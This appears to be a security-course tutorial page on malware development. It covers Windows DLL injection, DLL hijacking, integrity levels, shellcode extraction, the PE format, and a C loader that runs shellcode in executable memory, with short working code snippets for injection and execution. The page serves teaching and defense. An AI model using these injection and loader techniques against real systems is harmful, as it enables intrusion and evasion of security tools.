---
title: "Malware Development"
topic: "malware-dev"
tags: [malware, dll-injection, shellcode, process-injection, windows, evasion, pe]
difficulty: advanced
day: 41
layout: default
parent: Topics
nav_order: 41
---

# Malware Development

## What You Will Learn
- How DLL injection works and how to implement it
- What shellcode is and how to extract it from a binary
- How Windows integrity levels affect privilege
- What the Portable Executable (PE) format is

## What Is It?

Malware development covers the techniques used to create malicious software — not to deploy it, but to understand how it works. Security researchers study these techniques to build better detection and defenses.

This knowledge is essential for red teamers, malware analysts, and EDR developers.

## Why It Matters

- Understanding malware helps you defend against it
- Red team tools (implants, C2 agents) use these same techniques
- Malware analysis is a core skill for incident response

## Key Concepts

## Process Injection

Process injection places code inside a legitimate process so it runs with that process's permissions and identity. The basic flow:

1. Open a handle to the target process
2. Allocate memory in the target process
3. Write your code/shellcode into that memory
4. Create a remote thread to execute it

## DLL Injection

A DLL (Dynamic Link Library) is a Windows library that can be loaded by running processes. DLL injection forces a target process to load your DLL.

```bash
# Compile a DLL
gcc .\randomDll.cpp --shared -o outputfile.dll

# Load and run a DLL manually
rundll32.exe .\outputfile.dll,DllMain
```

DLL injection steps using Windows API:

```cpp
HANDLE hProcess = OpenProcess(PROCESS_ALL_ACCESS, FALSE, targetPID);
LPVOID pAddr = VirtualAllocEx(hProcess, NULL, MAX_PATH, MEM_COMMIT, PAGE_READWRITE);
WriteProcessMemory(hProcess, pAddr, dllPath, strlen(dllPath), NULL);
HANDLE hThread = CreateRemoteThread(hProcess, NULL, 0,
    (LPTHREAD_START_ROUTINE)LoadLibraryA, pAddr, 0, NULL);
```

## DLL Hijacking

If a legitimate process loads a DLL from a writable location, you can replace it with your own DLL. When the application runs, your code executes in its context.

## MIC (Mandatory Integrity Control)

Windows assigns integrity levels to processes and objects:

| Level | Description |
|-------|-------------|
| **Low** | Restricted — limited system access (browsers, sandboxes) |
| **Medium** | Standard users and administrative users when UAC is enabled |
| **High** | Running with administrative privilege |
| **System** | Running with SYSTEM privileges |

A process cannot write to objects with a higher integrity level than itself.

## Shellcode

Shellcode is a small piece of position-independent machine code used as a payload. It gets its name from its original purpose — spawning a shell.

### Extracting Shellcode from a Binary

```bash
objdump -d ./example3 | grep '[0-9a-f]:' | grep -v 'file' | \
  cut -f2 -d: | cut -f1-6 -d' ' | tr -s ' ' | tr '\t' ' ' | \
  sed 's/ $//g' | sed 's/ /\\x/g' | paste -d '' -s | \
  sed 's/^/"/' | sed 's/$/"/g'
```

### Running Shellcode in Memory

```c
#include <windows.h>

unsigned char shellcode[] = "\x90\x90..."; // your shellcode

int main() {
    LPVOID execMem = VirtualAlloc(NULL, sizeof(shellcode),
                                  MEM_COMMIT | MEM_RESERVE,
                                  PAGE_EXECUTE_READWRITE);
    memcpy(execMem, shellcode, sizeof(shellcode));
    ((void(*)())execMem)(); // cast and call
    return 0;
}
```

## Debugging API

Windows provides a Debugging API that allows one process to control and inspect another. Malware often uses this to inject into debugger-unaware processes or to detect if it is being analyzed.

Key functions: `DebugActiveProcess`, `WaitForDebugEvent`, `ContinueDebugEvent`.

## Portable Executable (PE) Format

The PE format is the executable file format on Windows (`.exe`, `.dll`). It contains:
- DOS header and stub
- PE header (machine type, characteristics)
- Section table (`.text`, `.data`, `.rdata`, `.rsrc`)
- Import Address Table (IAT)
- Export Address Table (EAT)

Understanding the PE format is essential for AV evasion, packing, and malware analysis.

## Resources

- [Elastic — Ten Process Injection Techniques](https://www.elastic.co/blog/ten-process-injection-techniques-technical-survey-common-and-trending-process)
- [MalDev Academy — Malware Development](https://maldevacademy.com/)
- [ired.team — Offensive Security Notes](https://www.ired.team/)
- [TryHackMe — Malware Analysis](https://tryhackme.com/room/malmalintroductory)
- [VX-Underground — Malware Source Collection](https://www.vx-underground.org/)
